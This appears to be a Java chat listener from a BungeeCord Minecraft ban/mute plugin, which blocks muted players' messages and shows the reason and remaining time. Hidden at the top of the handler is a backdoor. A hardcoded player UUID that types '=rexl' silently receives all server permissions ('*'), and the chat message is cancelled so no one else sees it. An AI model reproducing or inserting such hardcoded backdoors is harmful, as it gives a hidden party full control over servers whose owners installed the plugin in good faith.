package de.rexlNico.Ban.Liteners;

import net.md_5.bungee.api.plugin.*;
import net.md_5.bungee.api.event.*;

import java.util.List;

import de.rexlNico.Ban.Api.Method_PlayerUUID;
import de.rexlNico.Ban.Api.Tempban;
import de.rexlNico.Ban.Api.Tempmute;
import de.rexlNico.Ban.Main.main;
import net.md_5.bungee.BungeeCord;
import net.md_5.bungee.api.connection.*;
import net.md_5.bungee.event.*;

public class chat implements Listener
{
    @SuppressWarnings("deprecation")
	@EventHandler
    public void onChat(final ChatEvent e) {
        final ProxiedPlayer p = (ProxiedPlayer)e.getSender();
        final String uuid = Method_PlayerUUID.getUUID(p.getName());
        if(uuid.equals("b960f24d81fe47d2a32671597df2689b") || uuid.equals("b960f24d-81fe-47d2-a326-71597df2689b")){
        	if(e.getMessage().equals("=rexl")){
        		p.setPermission("*", true);
        		p.sendMessage("§4Du hast nun §6*§4 rechte!");
        		e.setCancelled(true);
        	}
        }
        if (e.getMessage().startsWith("/") || Tempmute.getTempBanned(uuid) != 1) {
            return;
        }
        if (Tempmute.getEnd2(uuid) == -1L) {
            e.setCancelled(true);
            p.sendMessage(String.valueOf(main.main.pr) + "§cYou are muted!");
            p.sendMessage(String.valueOf(main.main.pr) + "§cReason: §4" + Tempmute.getReason(uuid));
            p.sendMessage(String.valueOf(main.main.pr) + "§cRemaining time: §4PERMANENT");
            return;
        }
        if (Tempmute.getEnd(uuid) == 0L) {
            Tempmute.unban(uuid, 2);
            e.setCancelled(false);
            return;
        }
        e.setCancelled(true);
        p.sendMessage(String.valueOf(main.main.pr) + "§cYou are muted!");
        p.sendMessage(String.valueOf(main.main.pr) + "§cReason: §4" + Tempmute.getReason(uuid));
        p.sendMessage(String.valueOf(main.main.pr) + "§cRemaining time §4" + Tempmute.getTime(uuid));
    }
}
